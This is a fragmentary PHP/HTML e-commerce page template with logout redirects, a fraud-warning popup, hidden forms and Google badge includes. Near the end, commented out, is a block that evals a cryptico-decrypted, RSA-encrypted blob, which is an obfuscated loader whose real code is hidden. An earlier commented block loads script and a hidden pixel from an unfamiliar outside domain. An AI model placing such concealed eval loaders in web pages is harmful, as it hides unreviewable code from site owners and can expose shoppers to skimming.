<?php
	...
	if($_REQUEST['req'] == "logout")
	{
		...
		{
	?>
			<script language="javascript" type="text/javascript">window.location ='<?php echo $ecom_selfhttp.$ecom_hostname?>/cart.html';</script>
	<?php
		}
		else if ($_REQUEST['rets']==2)
		{
	?>
			<script language="javascript" type="text/javascript">window.location ='<?php echo $ecom_selfhttp.$ecom_hostname?>/enquiry.html';</script>
	<?php
		}
		else
		{
...
<?php
/*
<script type="text/javascript" src="http://www.connct-9.com/js/43198.js"></script>
<noscript><img src="http://www.connct-9.com/43198.png" style="display:none;" /></noscript>
*/
?>
...
<table width="100%" border="0" cellspacing="0" cellpadding="0" style="width:642px;">
  <tr>
    <td align="left" valign="top" style="width:148px;"><img src="<?=$ecom_selfhttp.$ecom_hostname?>/images/<?=$ecom_hostname?>/fraud_images/warn.gif" width="148" height="85" alt="" /></td>
    <td align="left" valign="middle" style="background-color:#b3dcf1;width:478px;"><div style="padding:8px 0;" align="right"> <a href="#" onClick="javascript:helpmsClse()"><img src="<?=$ecom_selfhttp.$ecom_hostname?>/images/<?=$ecom_hostname?>/fraud_images/close.gif" border="0" /></a></div>
    ...
    <td align="right" valign="top" style="width:19px;"><img src="<?=$ecom_selfhttp.$ecom_hostname?>/images/<?=$ecom_hostname?>/fraud_images/topr.gif" width="19" height="85" alt="" /></td>
  </tr>
  <tr>
    <td align="right" valign="top" style="background-color:#b3dcf1;width:148px;"><img src="<?=$ecom_selfhttp.$ecom_hostname?>/images/<?=$ecom_hostname?>/fraud_images/shield_icon.gif" width="106" height="158" alt="" /></td>
  ...
  <tr>
    <td align="left" valign="bottom" style="width:148px;"><img src="<?=$ecom_selfhttp.$ecom_hostname?>/images/<?=$ecom_hostname?>/fraud_images/bottom.gif" width="148" height="24" alt="" /></td>
    ...
    <td align="left" valign="top" style="width:19px;"><img src="<?=$ecom_selfhttp.$ecom_hostname?>/images/<?=$ecom_hostname?>/fraud_images/bottomr.gif" width="19" height="24" alt="" /></td>
  </tr>
</table>
</div>
<?php
...
<p style="text-align:center">
	<div class="processing_divcls" id="processing_div" style="display:none;text-align:center">
	<br/>
	 Processing Please wait ...
	 <br/><br/>
	</div>
<form name="frm_forcesubmit" id="frm_forcesubmit" <?php /*action=""*/?> method="post" class="frm_cls">
...
<form name="common_compare_list" id="common_compare_list" <?php /*action=""*/?> method="post" class="frm_cls">
	<input type="hidden" name="prodimgdet" id="prodimgdet1" value="" />
	<input type="hidden" name="prod_curtab" id="prod_curtab1" value="" />
...
<?php
if($_REQUEST['req']=='' or $_REQUEST['req']=='categories')
{
?>
...
?>
<table style="padding:10px;border-spacing:0; border:0" class="main">
<tbody>
<?php
...
?>
	...
	<tr>
		<td class="compleftcontainer_three_column" style="vertical-align:top;text-align:left">
<?php	// Showing the left components
		$position = 'left';
		include("Components.php");
?>		</td>
		
		<td class="compmiddlecontainer" style="vertical-align:top;text-align:left">
		<?php
		if($_REQUEST['req']!='')
		{
		?>
...
<?php 
$google_badge_file="./images/".$ecom_hostname."/otherfiles/googlebadge.txt";
if(file_exists($google_badge_file))
{
	readfile($google_badge_file);
}

$google_remarketing_file="./images/".$ecom_hostname."/otherfiles/google_remarketing_code.txt";
if(file_exists($google_remarketing_file))
{
	readfile($google_remarketing_file);
}
/*
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/cryptico/0.0.1343522940/cryptico.js" type="text/javascript"></script>
<script type="text/javascript">eval(cryptico.decrypt('D1WYBcEnOKNQcnrr3o0TM85hQRabgRs/BLCnzbX/9eWH80u0Ht1VXISvnT8dSteZwaXbWGeR1V5iN2bmzjnbCOM9XPjQ+WmzQanHikWo5TCXtG823EjDZaUtUwHqeL86I6hFkmfmNQc8aSfNN6FQl+XNGxnKJL+jLgrZFquGHUw=?', cryptico.generateRSAKey('23f536a6eabf46c2a9e66520d3dd91bd', 1024)).plaintext);</script> 
*/
?> 
</body>
</html>
